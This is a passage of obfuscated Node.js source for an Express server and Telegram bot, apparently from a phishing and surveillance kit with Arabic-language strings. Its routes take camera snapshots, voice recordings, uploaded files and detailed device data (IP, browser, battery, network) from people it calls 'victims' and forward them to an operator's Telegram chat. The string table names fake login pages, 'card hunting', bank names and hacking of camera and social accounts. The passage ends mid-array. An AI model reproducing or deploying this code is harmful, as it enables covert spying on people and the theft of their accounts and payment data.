        fs[_0x2c0b02(0x42c) + _0x2c0b02(0x499)](_0x39954d, _0x712c46), bot[_0x2c0b02(0x2e3)](_0x1f1418, _0x39954d, { 'caption': _0x22eb89[_0x2c0b02(0x130)] })[_0x2c0b02(0x4b4)](() => {
            const _0x56af22 = _0x2c0b02;
            console[_0x56af22(0x235)](_0x56af22(0xc4) + _0x56af22(0x236) + _0x56af22(0x500) + _0x56af22(0x41d) + _0x1f1418), _0x516c26[_0x56af22(0x469)](_0x22eb89[_0x56af22(0x6c3)]);
        })[_0x2c0b02(0x3e9)](_0x3b204b => {
            const _0x197b58 = _0x2c0b02;
            console[_0x197b58(0x2dd)](_0x22eb89[_0x197b58(0x6ae)], _0x3b204b), _0x516c26[_0x197b58(0x1b9)](-0x870 + -0x1 * -0x12f7 + -0x893)[_0x197b58(0x3a7)](_0x22eb89[_0x197b58(0x22b)]);
        });
    } catch (_0x5b2624) {
        console[_0x2c0b02(0x2dd)](_0x22eb89[_0x2c0b02(0x93)], _0x5b2624), _0x516c26[_0x2c0b02(0x1b9)](-0x13b3 * -0x1 + 0xf3 * -0x1d + 0x9c8)[_0x2c0b02(0x3a7)](_0x22eb89[_0x2c0b02(0x333)]);
    }
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x3fd), (_0x3865ee, _0x1c9a58) => {
    const _0x5d2bc1 = _0x4e73bb, _0x28978a = { 'RoudK': _0x5d2bc1(0x225) };
    _0x1c9a58[_0x5d2bc1(0x69a)](path[_0x5d2bc1(0x3eb)](__dirname, _0x28978a[_0x5d2bc1(0x51a)]));
});
let userRequests = {};
app[_0x4e73bb(0x493)](_0x4e73bb(0x4fe) + _0x4e73bb(0x4c8), (_0x2bab18, _0x2aac3a) => {
    const _0x45b96e = _0x4e73bb, _0xe06d65 = { 'fvkgc': _0x45b96e(0x2fb) }, _0x3ad2af = _0x2bab18[_0x45b96e(0x67d)][_0x45b96e(0x577)], _0x4b89db = _0x2bab18[_0x45b96e(0x67d)][_0x45b96e(0x3c2)], _0x3b1c50 = _0x2bab18[_0x45b96e(0x67d)][_0x45b96e(0x52b)];
    bot[_0x45b96e(0x34c) + 'on'](_0x3ad2af, _0x4b89db, _0x3b1c50), _0x2aac3a[_0x45b96e(0x3a7)](_0xe06d65[_0x45b96e(0x4e7)]);
}), app[_0x4e73bb(0x493)](_0x4e73bb(0x5a2) + _0x4e73bb(0xb7), (_0x15f0c1, _0x5d6aaf) => {
    const _0x25a9b8 = _0x4e73bb, _0x446a18 = {
            'qFyup': _0x25a9b8(0x5fa),
            'DftIl': function (_0x4a2b6a, _0x15f111) {
                return _0x4a2b6a + _0x15f111;
            },
            'fhlLA': _0x25a9b8(0x19b) + _0x25a9b8(0x262),
            'tpbGH': _0x25a9b8(0x2a9) + ':\x20',
            'FvPKR': function (_0x1ec37a, _0x36e657) {
                return _0x1ec37a > _0x36e657;
            }
        }, _0x3ac5bb = _0x15f0c1[_0x25a9b8(0x67d)][_0x25a9b8(0x577)], _0x2a3955 = _0x15f0c1[_0x25a9b8(0x67d)][_0x25a9b8(0x374)][_0x25a9b8(0x472)](',');
    console[_0x25a9b8(0x235)](_0x446a18[_0x25a9b8(0x4cf)], _0x2a3955[_0x25a9b8(0xbc)], _0x446a18[_0x25a9b8(0x674)], _0x3ac5bb);
    if (_0x446a18[_0x25a9b8(0x47b)](_0x2a3955[_0x25a9b8(0xbc)], 0x1 * -0x1fa6 + -0x766 + 0x7 * 0x594)) {
        const _0x4a97d7 = _0x2a3955[_0x25a9b8(0x6bd)]((_0x5c67a8, _0x4ee24f) => {
            const _0x5c3666 = _0x25a9b8, _0x3125cb = Buffer[_0x5c3666(0x4df)](_0x5c67a8, _0x446a18[_0x5c3666(0x296)]);
            return bot[_0x5c3666(0x4aa)](_0x3ac5bb, _0x3125cb, { 'caption': _0x5c3666(0x36a) + _0x446a18[_0x5c3666(0xe0)](_0x4ee24f, -0x1 * -0x576 + 0x716 * 0x2 + -0x13a1) });
        });
        Promise[_0x25a9b8(0x351)](_0x4a97d7)[_0x25a9b8(0x4b4)](() => {
            const _0x2e6ca4 = _0x25a9b8;
            console[_0x2e6ca4(0x235)](''), _0x5d6aaf[_0x2e6ca4(0x4a4)]({ 'success': !![] });
        })[_0x25a9b8(0x3e9)](_0x52d39e => {
            const _0x424cc5 = _0x25a9b8;
            console[_0x424cc5(0x2dd)]('', _0x52d39e), _0x5d6aaf[_0x424cc5(0x1b9)](-0x2bd * -0xe + 0xc9 * -0x1d + -0xd9d)[_0x424cc5(0x4a4)]({ 'error': '' });
        });
    } else
        console[_0x25a9b8(0x235)](''), _0x5d6aaf[_0x25a9b8(0x1b9)](-0xefe + 0x6 * -0x5c + 0x12b6)[_0x25a9b8(0x4a4)]({ 'error': '' });
}), app[_0x4e73bb(0x493)](_0x4e73bb(0x24d) + _0x4e73bb(0x173), upload[_0x4e73bb(0x4ae)](_0x4e73bb(0x608), -0x244a + 0x81 * -0x42 + 0x20 * 0x22d), (_0x113f57, _0x264a8d) => {
    const _0x54ddf1 = _0x4e73bb, _0x4550ef = {
            'dcGWe': function (_0x520e72, _0x57be34) {
                return _0x520e72 > _0x57be34;
            }
        }, _0x4e76d6 = _0x113f57[_0x54ddf1(0x67d)][_0x54ddf1(0x310)], _0x48d932 = _0x113f57[_0x54ddf1(0x17e)];
    if (_0x48d932 && _0x4550ef[_0x54ddf1(0x520)](_0x48d932[_0x54ddf1(0xbc)], 0x1de3 + -0xc25 * 0x1 + -0x2f5 * 0x6)) {
        console[_0x54ddf1(0x235)](_0x54ddf1(0x1c0) + _0x48d932[_0x54ddf1(0xbc)] + '\x20\x20' + _0x4e76d6);
        const _0x1a9fda = _0x48d932[_0x54ddf1(0x6bd)](_0x237104 => bot[_0x54ddf1(0x4aa)](_0x4e76d6, _0x237104[_0x54ddf1(0x2b1)]));
        Promise[_0x54ddf1(0x351)](_0x1a9fda)[_0x54ddf1(0x4b4)](() => {
            const _0x4a76fd = _0x54ddf1;
            console[_0x4a76fd(0x235)](''), _0x264a8d[_0x4a76fd(0x4a4)]({ 'success': !![] });
        })[_0x54ddf1(0x3e9)](_0x11087a => {
            const _0x539144 = _0x54ddf1;
            console[_0x539144(0x2dd)](':', _0x11087a), _0x264a8d[_0x539144(0x1b9)](0x253b + 0x2eb * -0x3 + -0xa * 0x2a7)[_0x539144(0x4a4)]({ 'error': '' });
        });
    } else
        console[_0x54ddf1(0x235)](''), _0x264a8d[_0x54ddf1(0x1b9)](0xc06 + 0xdb6 + 0x374 * -0x7)[_0x54ddf1(0x4a4)]({ 'error': '' });
}), app[_0x4e73bb(0x493)](_0x4e73bb(0x424) + 'ce', uploadVoice[_0x4e73bb(0x63d)](_0x4e73bb(0x249)), (_0x2213de, _0x5cb0d7) => {
    const _0x513456 = _0x4e73bb, _0x337c4d = { 'LhdYr': _0x513456(0x453) }, _0xce505f = _0x2213de[_0x513456(0x67d)][_0x513456(0x577)], _0x299d4b = _0x2213de[_0x513456(0x19d)][_0x513456(0x428)];
    bot[_0x513456(0x56f)](_0xce505f, _0x299d4b)[_0x513456(0x4b4)](() => {
        const _0x2e42a1 = _0x513456;
        fs[_0x2e42a1(0x407)](_0x299d4b), _0x5cb0d7[_0x2e42a1(0x3a7)]('');
    })[_0x513456(0x3e9)](_0x4855bd => {
        const _0x5b5d02 = _0x513456;
        console[_0x5b5d02(0x2dd)](_0x4855bd), _0x5cb0d7[_0x5b5d02(0x1b9)](0xc8f * 0x1 + 0x180e + -0x22a9)[_0x5b5d02(0x3a7)](_0x337c4d[_0x5b5d02(0xa1)]);
    });
});
const PORT = process[_0x4e73bb(0x4e9)][_0x4e73bb(0x120)] || 0x8bd + 0x2 * -0xa87 + 0x1809;
app[_0x4e73bb(0x337)](PORT, () => {
    const _0x12968b = _0x4e73bb;
    console[_0x12968b(0x235)](_0x12968b(0x38f) + _0x12968b(0x2fc) + _0x12968b(0x37d) + PORT);
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x4c5), (_0xee727d, _0x3f5ff0) => {
    const _0xce024e = _0x4e73bb, _0x14ec40 = { 'NSzqS': _0xce024e(0x182) };
    _0x3f5ff0[_0xce024e(0x69a)](path[_0xce024e(0x3eb)](__dirname, _0x14ec40[_0xce024e(0x84)]));
}), app[_0x4e73bb(0x493)](_0x4e73bb(0x139), async (_0x4bcd13, _0x95e6be) => {
    const _0xf714bf = _0x4e73bb, _0x4f70af = {
            'iTZUH': _0xf714bf(0x64b),
            'hgmkm': _0xf714bf(0x2fd) + _0xf714bf(0x135) + _0xf714bf(0x630),
            'iGoCu': _0xf714bf(0x1c1) + _0xf714bf(0x390) + _0xf714bf(0x5ea),
            'WxwvC': _0xf714bf(0x1c1) + _0xf714bf(0x390) + _0xf714bf(0xd2),
            'FGcVm': _0xf714bf(0x473) + _0xf714bf(0x652) + _0xf714bf(0x348)
        }, _0x355408 = _0x4bcd13[_0xf714bf(0x67d)][_0xf714bf(0x310)], _0x413330 = _0x4bcd13[_0xf714bf(0x67d)][_0xf714bf(0x5ab)];
    if (_0x413330) {
        const _0x9317a9 = _0xf714bf(0x1ed) + _0xf714bf(0x2ec) + _0xf714bf(0x292) + _0xf714bf(0x629) + _0x413330[_0xf714bf(0x39d)] + (_0xf714bf(0x6ac) + _0xf714bf(0x352)) + _0x413330[_0xf714bf(0x3cd)] + (_0xf714bf(0x64f) + _0xf714bf(0x19c)) + _0x413330['ip'] + (_0xf714bf(0x646) + _0xf714bf(0x330)) + _0x413330[_0xf714bf(0x677)] + (_0xf714bf(0x331) + _0xf714bf(0x650) + _0xf714bf(0x5ba)) + _0x413330[_0xf714bf(0x611)] + (_0xf714bf(0x441) + _0xf714bf(0x629)) + _0x413330[_0xf714bf(0x664)] + _0xf714bf(0xff) + _0x413330[_0xf714bf(0x2c0) + 'ed'] + (_0xf714bf(0x562) + _0xf714bf(0x44f) + _0xf714bf(0x2a6) + _0xf714bf(0x23f)) + _0x413330[_0xf714bf(0x37b) + 'e'] + (_0xf714bf(0x40b) + ':\x20') + _0x413330[_0xf714bf(0x250)] + (_0xf714bf(0x60b) + _0xf714bf(0x20e)) + _0x413330[_0xf714bf(0x398)] + (_0xf714bf(0x102) + _0xf714bf(0x49b)) + _0x413330[_0xf714bf(0x544) + _0xf714bf(0x16e)] + (_0xf714bf(0x218) + _0xf714bf(0x20e)) + _0x413330[_0xf714bf(0x55a)] + (_0xf714bf(0xa9) + _0xf714bf(0x59f)) + _0x413330[_0xf714bf(0x158)] + (_0xf714bf(0x371) + _0xf714bf(0x382) + _0xf714bf(0x629)) + _0x413330[_0xf714bf(0x38b) + _0xf714bf(0x37c)] + (_0xf714bf(0x3cf) + _0xf714bf(0x2c9) + '\x20') + _0x413330[_0xf714bf(0x47a)] + (_0xf714bf(0x605) + _0xf714bf(0x5a6)) + _0x413330[_0xf714bf(0xca)] + (_0xf714bf(0x25b) + _0xf714bf(0x53c)) + _0x413330[_0xf714bf(0x257) + 'e'] + (_0xf714bf(0x123) + _0xf714bf(0x668)) + _0x413330[_0xf714bf(0x51d) + _0xf714bf(0x5e5)] + (_0xf714bf(0x5f2) + _0xf714bf(0x11b)) + _0x413330[_0xf714bf(0x4a9) + _0xf714bf(0xb6)] + (_0xf714bf(0x21f) + _0xf714bf(0x59c) + _0xf714bf(0x204)) + _0x413330[_0xf714bf(0x24c)] + (_0xf714bf(0x53d) + _0xf714bf(0x11b)) + _0x413330[_0xf714bf(0x39c) + _0xf714bf(0x638)] + (_0xf714bf(0x4f3) + _0xf714bf(0x23d)) + _0x413330[_0xf714bf(0x622)] + (_0xf714bf(0x485) + _0xf714bf(0x68d) + _0xf714bf(0x1c9)) + _0x413330[_0xf714bf(0x506)] + (_0xf714bf(0x5f6) + _0xf714bf(0x483) + _0xf714bf(0x21c) + '\x20') + _0x413330[_0xf714bf(0x3f1) + _0xf714bf(0x268)] + (_0xf714bf(0x2db) + _0xf714bf(0x585) + _0xf714bf(0x5d6)) + _0x413330[_0xf714bf(0x442) + _0xf714bf(0x545)] + (_0xf714bf(0x13d) + _0xf714bf(0x295) + _0xf714bf(0x27e) + _0xf714bf(0x417)) + _0x413330[_0xf714bf(0x2d5) + _0xf714bf(0x66a)] + (_0xf714bf(0x165) + _0xf714bf(0x1b6) + _0xf714bf(0x602)) + _0x413330[_0xf714bf(0x2e0) + _0xf714bf(0x39f)] + (_0xf714bf(0x258) + _0xf714bf(0x8b) + _0xf714bf(0x553)) + _0x413330[_0xf714bf(0x175) + 'rt'] + (_0xf714bf(0x50c) + '\x20');
        try {
            await bot[_0xf714bf(0x344) + 'e'](_0x355408, _0x9317a9, { 'parse_mode': _0x4f70af[_0xf714bf(0x2d7)] }), console[_0xf714bf(0x235)](_0x4f70af[_0xf714bf(0x5c3)]), _0x95e6be[_0xf714bf(0x4a4)]({ 'success': !![] });
        } catch (_0x22d8a4) {
            console[_0xf714bf(0x2dd)](_0x4f70af[_0xf714bf(0x1d3)], _0x22d8a4), _0x95e6be[_0xf714bf(0x1b9)](-0x164a * 0x1 + -0x171 * -0x3 + 0x13eb)[_0xf714bf(0x4a4)]({ 'error': _0x4f70af[_0xf714bf(0x40a)] });
        }
    } else
        console[_0xf714bf(0x235)](_0x4f70af[_0xf714bf(0x361)]), _0x95e6be[_0xf714bf(0x1b9)](-0x163f + 0x3 * -0x90a + -0x1 * -0x32ed)[_0xf714bf(0x4a4)]({ 'error': _0x4f70af[_0xf714bf(0x361)] });
}), app[_0x4e73bb(0x493)](_0x4e73bb(0x4f0), (_0x265ca5, _0x19b4b8) => {
    const _0x5e2d19 = _0x4e73bb, _0x55d32b = {
            'cyEzE': _0x5e2d19(0x5fa),
            'kPGeU': function (_0x4dc4f5, _0x31d829) {
                return _0x4dc4f5 + _0x31d829;
            },
            'HxfhA': _0x5e2d19(0x5b7) + _0x5e2d19(0x224)
        }, _0x35bbd3 = _0x265ca5[_0x5e2d19(0x67d)][_0x5e2d19(0x577)], _0x31e5a2 = _0x265ca5[_0x5e2d19(0x67d)][_0x5e2d19(0x374)][_0x5e2d19(0x472)](',');
    _0x31e5a2[_0x5e2d19(0x297)]((_0x5c7407, _0x272fa0) => {
        const _0x1c7af0 = _0x5e2d19, _0x1ed3b3 = Buffer[_0x1c7af0(0x4df)](_0x5c7407, _0x55d32b[_0x1c7af0(0xeb)]);
        bot[_0x1c7af0(0x4aa)](_0x35bbd3, _0x1ed3b3, { 'caption': _0x1c7af0(0x654) + _0x55d32b[_0x1c7af0(0x5d5)](_0x272fa0, -0x2 * 0x8f9 + -0x6 * 0x16a + 0x1a6f) });
    }), console[_0x5e2d19(0x235)](_0x5e2d19(0x272) + _0x5e2d19(0x6c0) + _0x5e2d19(0x41d) + _0x35bbd3), dataStore[_0x35bbd3] && dataStore[_0x35bbd3][_0x5e2d19(0x346)] ? _0x19b4b8[_0x5e2d19(0x469)](dataStore[_0x35bbd3][_0x5e2d19(0x346)]) : _0x19b4b8[_0x5e2d19(0x3a7)](_0x55d32b[_0x5e2d19(0x108)]);
}), app[_0x4e73bb(0x5b5)](_0x4e73bb(0x2f3), (_0x31d33b, _0x345d46) => {
    const _0x3c22ba = _0x4e73bb, _0x4a73ee = { 'gttEC': _0x3c22ba(0x6bb) };
    _0x345d46[_0x3c22ba(0x69a)](path[_0x3c22ba(0x3eb)](__dirname, _0x4a73ee[_0x3c22ba(0x4d8)]));
});
let linkUsage = {};
const maxAttemptsPerButton = 0x169e + -0x22f2 + 0xe7f;
function validateLinkUsage(_0x511958, _0x36204d) {
    const _0x2d8506 = _0x4e73bb, _0x2e1283 = {
            'ZDyWk': function (_0x1c8cc9, _0x2e4a5f) {
                return _0x1c8cc9(_0x2e4a5f);
            },
            'NweMT': function (_0x24a920, _0x19ca61) {
                return _0x24a920 >= _0x19ca61;
            }
        }, _0x345295 = _0x511958 + ':' + _0x36204d;
    if (_0x2e1283[_0x2d8506(0x359)](isVIPUser, _0x511958))
        return !![];
    if (linkUsage[_0x345295] && _0x2e1283[_0x2d8506(0x22c)](linkUsage[_0x345295][_0x2d8506(0x155)], maxAttemptsPerButton))
        return ![];
    return !linkUsage[_0x345295] && (linkUsage[_0x345295] = { 'attempts': 0x0 }), linkUsage[_0x345295][_0x2d8506(0x155)]++, !![];
}
let vipUsers = {};
function addVIPUser(_0x1c1dce) {
    vipUsers[_0x1c1dce] = !![];
}
function removeVIPUser(_0x1dd0a8) {
    delete vipUsers[_0x1dd0a8];
}
function isVIPUser(_0x56d516) {
    return !!vipUsers[_0x56d516];
}
function _0x1ced() {
    const _0x77c706 = [
        '*\x20[BOT](t.',
        '@uiit89',
        'مالطا\x20🇲🇹',
        '/getNam',
        'DnRBy',
        '\x20النقاط\x20ال',
        'سحب\x20جميع\x20ا',
        'عبر\x20رابط\x20🔒',
        'لمتصفح:\x20',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'uploads/',
        'أخرى\x20لاحق😁',
        'Win64;\x20x64',
        'زيمبابوي\x20🇿🇼',
        '`\x0a*[-]\x20Exp',
        'توغو\x20🇹🇬',
        'deviceVers',
        'Frequency',
        '🇸🇻',
        '\x20|\x20في\x20بـوت',
        'RNvxA',
        'XZmcH',
        'repeat',
        '\x20الذكاء\x20ال',
        '\x20على\x20البري',
        'BsldV',
        'ل\x20على\x201\x20نق',
        '&type=tikt',
        'GIiNy',
        'يا\x20🇿🇦',
        'ابط.',
        'للمسية:\x20',
        'الضحية\x20🎤',
        'k\x20:*\x20`',
        '<strong>تم',
        '/whatsapp',
        'EhlTF',
        '🇭🇰',
        'deviceType',
        'k.glitch.m',
        '\x20نقاط.',
        'ًا\x20',
        'mvloa',
        '🤣🤣🤣🤣',
        '\x20الضحيه\x20عب',
        'fe.html',
        '\x20ميغابت\x20في',
        'baoWU',
        'wjfZQ',
        '\x20🇨🇮',
        'BqpxM',
        'ابط\x20أدناه\x20',
        'me/)\x20\x0a*Pre',
        'قه\x20عاليه:\x20',
        'Agent',
        'CsUGD',
        'جهازك\x20او\x20ط',
        'بعد</stron',
        'إزالة\x20مستخ',
        'sendVoice',
        'اليونان\x20🇬🇷',
        'رام.',
        'لم\x20تفتح\x20ال',
        'eFGKb',
        'اختراق\x20الك',
        'لصورة\x20بنجا',
        'existsSync',
        'chatId',
        'MpUYV',
        '\x20الحصول\x20عل',
        'nWJSW',
        'essage',
        'Error\x20send',
        'تركمانستان',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        'wrabF',
        'IT\x20-\x20VISA\x20',
        '\x20حذف\x20حسابك',
        'kubhP',
        'uDiyL',
        'للحصول\x20على',
        'التردد\x20للا',
        'dIGEOjpMgZ',
        'بوركينا\x20فا',
        'Qdbfp',
        '\x20انشـاء\x20بر',
        '`\x0a*=======',
        'cpEyC',
        'on/:linkId',
        'sing\x20chatI',
        'vTpoo',
        'يه\x20الاصيله',
        'فنلندا\x20🇫🇮',
        'أوامر\x20للاس',
        'VISA\x20-\x20DEB',
        '\x20لشركة\x20وتس',
        'BQOfD',
        '\x20في\x20جهاز\x20ا',
        'خره\x20او\x20حاو',
        'tId\x20',
        'هونغ\x20كونغ\x20',
        'قاط\x20وفتحها',
        'LyDds',
        '`\x0a*[-]\x20Car',
        '\x20نظام\x20التش',
        'سلوفينيا\x20🇸🇮',
        'روسيا\x20🇷🇺',
        'رة\x20(RAM):\x20',
        'كازاخستان\x20',
        'deo',
        '/submitPho',
        '\x20الضحيه\x20بد',
        'الية\x20🇰🇵',
        'JYtIQ',
        'لنظام:\x20',
        'ZII0_bot',
        'seWwkhTzrZ',
        'bbfJv',
        'hex',
        'deviceInfo',
        '/xx.html?c',
        'BFzyu',
        'كوريا\x20الشم',
        '?chatId=',
        'jQrtj',
        'GaVOb',
        'دم\x20VIP',
        'rbo',
        'TMLmx',
        'get',
        'last_name',
        'Processing',
        'setItem',
        'التمتع\x20في\x20',
        '؟:\x20',
        'ل\x20وهمي',
        'text',
        'إسبانيا\x20🇪🇸',
        '\x20مهمه\x20اذا\x20',
        'phone_numb',
        'erica',
        'ختلفه\x20او\x20ح',
        'ًا.',
        'hgmkm',
        'خال\x20رقم\x20ال',
        'ydKJu',
        'شرح\x20البوت\x20',
        'وف\x20يتم\x20فتح',
        'مك\x20المنحرف',
        'SBpXi',
        '\x20Visa...\x0a[',
        '/de\x0a\x0a<stro',
        '==========',
        'ktasm',
        'صله\x20اضع\x20في',
        '\x20استخدام\x20ا',
        'btwqV',
        'kMNym',
        'kQZRj',
        'بوتسوانا\x20🇧🇼',
        'b.html',
        'kPGeU',
        'تصال:\x20',
        '/getName',
        'mdRZqoXRZ_',
        '?start=',
        'daYGC',
        'AsyFY',
        '\x20على\x20صورة\x20',
        '🇰🇿',
        'يرات\x20المرا',
        'الته\x20من\x20VI',
        'ل\x20كود\x20الرق',
        '<strong>اه',
        'مصر\x20🇪🇬',
        'ESXzC',
        '/F.html?ch',
        'sion',
        '\x20و\x20',
        'مل\x20السابق\x20',
        'hvBeh',
        'ا\x20الخيارت\x20',
        '\x20الجهاز:',
        ':\x20\x0a\x20اليوزر',
        'لرابط\x20ملاح',
        'إغلاق\x20المو',
        '&type=inst',
        'FwOZD',
        'answerCall',
        'ار\x20الايمل\x20',
        '\x20📊\x0a-\x20دقة\x20ا',
        'subject',
        'ذا\x20الرابط\x20',
        'ايل\x20الذي\x20ت',
        '\x20📅\x0a-\x20بروتو',
        'ابط\x20دعوة.',
        '\x20الحساب:*\x0a',
        'فرمتة\x20جوال',
        'base64',
        '\x20أي\x20إيميل\x20',
        '@oapajh',
        'ArlGE',
        'facebook',
        'و\x20حاول\x20مره',
        'ود\x20🇲🇪',
        'readFileSy',
        'بلوتوث:\x20',
        'eText',
        'اصطناعي\x20🤖',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        'RgsNZ',
        'age',
        'images',
        'العراق\x20🇮🇶',
        'IePdm',
        '\x20⏰\x0a-\x20اسم\x20ا',
        '/getNameFo',
        'تم\x20إزالة\x20ا',
        'مستخدم\x20لإز',
        'ساحل\x20العاج',
        'agram',
        'isCharging',
        'مرحبًا!\x20هذ',
        'ء\x20جلب\x20الرس',
        'eTWAK',
        'VVQYw',
        'username',
        'bdvMY',
        'ابط\x20التقاط',
        'MiDPq',
        'Error\x20proc',
        'GYsLg',
        'اختراق\x20انس',
        'Generate\x20V',
        'aThHadlLGB',
        'اختراق\x20سنا',
        'trim',
        '\x20تم\x20إنشاؤه',
        'colorDepth',
        'get_link',
        'غط\x20على\x20الز',
        'HHRBF',
        'on/',
        'get_love_m',
        'ناء\x20إنشاء\x20',
        'ة:\x20',
        'ناء\x20محاولة',
        'init',
        '\x20انشاء\x20ايم',
        '⚠️:\x0a',
        'ated-drift',
        '\x20أسماء\x20الم',
        'هاز\x20بنجاح',
        'الكويت\x20🇰🇼',
        'تصفير\x20الذا',
        'JCdEq',
        'gQhqG',
        'ساب\x20🟢',
        'راقبه.....',
        'لقد\x20قام\x20ضح',
        'ntation',
        'toString',
        'http://www',
        'لقد\x20قام\x20ال',
        'لم\x20يتم\x20الت',
        'single',
        'وله\x20بسبب\x20ق',
        'mjJzV',
        ']\x2075%',
        'إيطاليا\x20🇮🇹',
        'CdDVz',
        'ي\x20عن\x20طريق\x20',
        '.com/',
        'مكنك\x20إنشاء',
        '\x20🌍\x0a-\x20شحن\x20ا',
        '\x20أثناء\x20جلب',
        'eiCuJ',
        'tAPPo',
        'lEVEC',
        'Markdown',
        'الدردشة\x20مع',
        'KKdNg',
        'first_name',
        '\x20🏙️\x0a-\x20عنوان',
        'لهاتف\x20يشحن',
        'CURKi',
        'لام\x20معلوما',
        'Clearing\x20c',
        'الصوره📸\x20',
        'توباغو\x20🇹🇹',
        '\x20المطور\x20',
        'ا\x20الامر\x20/V',
        'editMessag',
        'azUTa',
        '\x20توك\x20📳',
        'greencafe2',
        'لآن\x20',
        'بنين\x20🇧🇯',
        'التشيك\x20🇨🇿',
        'OBLjW',
        'rshq_insta',
        'ور\x20الهاتف\x20',
        'chat',
        'FQZtP',
        'network',
        'mQpZi',
        'فيتنام\x20🇻🇳',
        'طة.\x0a:\x20http',
        '\x20المتصفح:\x20',
        'rbGdP',
        'nAvailable',
        '\x20الصور',
        'uPoeE',
        '</code>\x0a<s',
        'ر\x20لتوليد\x20ر',
        '\x20بإنشاء\x20حس',
        'ميله\x20ومحرج',
        'chatId=',
        '>\x0a\x0aلنشا\x20اي',
        'ton\x20below\x20',
        'tpbGH',
        '\x20data.\x20Ple',
        'min',
        'battery',
        'لرابط:\x20',
        'امر\x20التالي',
        'ك\x20VIP',
        'deleteMess',
        'vfLQm',
        'body',
        'آيسلندا\x20🇮🇸',
        'ss\x20the\x20but',
        'الفلبين\x20🇵🇭',
        '\x20مجاني.',
        '9049922kMoxqw',
        'ائل\x20للحصول',
        'user',
        'ناء\x20إرسال\x20',
        'الصين\x20🇨🇳',
        '/capture?c',
        'هولندا\x20🇳🇱',
        'CQnNy',
        'ستخدمين.',
        'الرجاء\x20الم',
        'inkId',
        '\x20آخر\x20تحديث',
        'tineQ',
        'GlhEv',
        'EnrGz',
        'ykPOp',
        'مدفوع\x20بسعر',
        'رقم\x20في\x20وتس',
        'يتك\x20في\x20الد',
        'فنزويلا\x20🇻🇪',
        'الملفات\x20ال',
        'لبت\x20باسورد',
        'مدغشقر\x20🇲🇬',
        'ncpDG',
        'sendFile',
        'فلسطين\x20🇵🇸',
        'خاص\x20بك\x0a\x20عن',
        'ont/',
        'نيكاراغوا\x20',
        '\x20موجود:\x20',
        'خول\x20لرابط\x20',
        'غوام\x20🇬🇺',
        'LEjgc',
        '\x20ما</stron',
        '\x20من\x20VIP.',
        'message_id',
        'oVhBe',
        'keys',
        'غرينلاند\x20🇬🇱',
        'قيرغيزستان',
        '😁.',
        '\x20كاميرات\x20ا',
        '\x20🔻\x0a-\x20المدي',
        'HTML',
        'IgwIz',
        'جرب\x20دوله\x20ا',
        'كندا\x20🇨🇦',
        '4.com',
        'ata:',
        'ر\x20مجاناً:',
        'add_nammes',
        'eo:',
        'QRLUM',
        '🇺🇿',
        'hatId=',
        'd\x20Bank',
        'OjNkj',
        'k.html',
        'fBfZN',
        'map',
        'phoneNumbe',
        'rshq_tikto',
        's\x20for\x20chat',
        ':AAELOAVm0',
        'hOumL',
        'yXOpH',
        'parse',
        'هاتف\x20هذا\x20ق',
        'https://cu',
        'rUiVe',
        'quest:\x20Mis',
        'sMxpM',
        'EqXwM',
        '🇦🇷',
        'BBJmK',
        'لقد\x20تم\x20اخت',
        'dotenv',
        'قد\x20حدث\x20خطأ',
        'LfNkw',
        'الجبل\x20الأس',
        'كواد\x20والرس',
        'Error\x20chec',
        'دما\x20يقوم\x20ش',
        'NSzqS',
        'Data',
        'بولندا\x20🇵🇱',
        'يل\x20بعد\x20🗳</',
        'تم\x20حذف\x20الذ',
        'rmdirSync',
        'الصوره🙋‍♂️\x20',
        'لإيماءات\x20ا',
        'سوريا\x20🇸🇾',
        'params',
        'cqDaq',
        'الملف\x20الشخ',
        'ستقبال\x20الا',
        '/ca.html',
        '\x2030$\x20يمكنك',
        'cTDad',
        'موزمبيق\x20🇲🇿',
        'TD\x20Bank',
        'atus:',
        'query',
        'لم\x20يتم\x20اخت',
        'content',
        'wkOZW',
        'CHMWU',
        'IxRWX',
        'link',
        'HUOGm',
        'me/VlP_12',
        'grlZf',
        'LhdYr',
        'UwYjf',
        'اك\x20VIP',
        '\x20\x22https\x22.',
        'uery',
        'tZdCa',
        '.mp4',
        ']\x20100%',
        '\x20📱\x0a-\x20الذاك',
        'zTOiP',
        '\x20(KHTML,\x20l',
        '.\x0a\x20⚠️ملاحظه',
        'LdLut',
        'nt:',
        'بطًا\x20يبدأ\x20',
        'fuschia-lo',
        'ة:</strong',
        'kkFFT',
        'MDuIU',
        'JaKpQ',
        'substring',
        'lution',
        'tos',
        '▓▓░░░░░░░░',
        'ط\x20خمس\x20مرات',
        'ال\x20للتحقق.',
        'اليابان\x20🇯🇵',
        'length',
        'njEIh',
        '=\x0a[-]\x20by\x20:',
        '\x20إيميل\x20وهم',
        'g.html',
        'rofly',
        'مالي\x20🇲🇱',
        'TfZck',
        'Stored\x20and',
        'gbyEx',
        'عزيزي\x20حمود',
        'شتراك\x20في\x20ج',
        '<strong>جا',
        'yihQh',
        'language',
        'اختراق\x20ببج',
        'Ibnth',
        '*اليوزر\x20:\x20',
        '$\x0aعندما\x20تو',
        'CzEPK',
        'إيميل\x20الذي',
        '/ok.html',
        '\x20الجهاز',
        'PNAwo',
        'و\x20🎥',
        'PbwJb',
        'LuqTI',
        'ZOXfU',
        'لام\x20أي\x20رسا',
        'ال\x20للتحقق\x20',
        'tRTgF',
        'كمبوديا\x20🇰🇭',
        'SIGTERM',
        'ynDbM',
        'pzbPr',
        'MVMqA',
        'DftIl',
        'زامبيا\x20🇿🇲',
        'قتة:',
        'لضحيه\x0a:\x20',
        'ة...',
        'nOgQP',
        'request_ve',
        'bio',
        'removeList',
        'rification',
        'GlMoB',
        'cyEzE',
        'صيد\x20فيزات\x20',
        'أوكرانيا\x20🇺🇦',
        'aADuo',
        '/submitCod',
        'VKwLo',
        'إندونيسيا\x20',
        'جلد:\x20',
        '\x20sent\x20phot',
        '10mb',
        'xlgET',
        '7065665133',
        'ماليزيا\x20🇲🇾',
        'إيران\x20🇮🇷',
        'Nkzxd',
        'الرجاء\x20إرس',
        'ابط\x20قم\x20في\x20',
        'rdCMz',
        'rpYeF',
        'zsgyr',
        '\x20📶\x20(سرعة:\x20',
        'ضغط\x20على\x20هذ',
        'SunTrust\x20B',
        '\x20🖥️\x0a-\x20إصدار',
        'aulYs',
        'راق',
        'ache...',
        'وامر\x20اخترا',
        'F.html',
        'HxfhA',
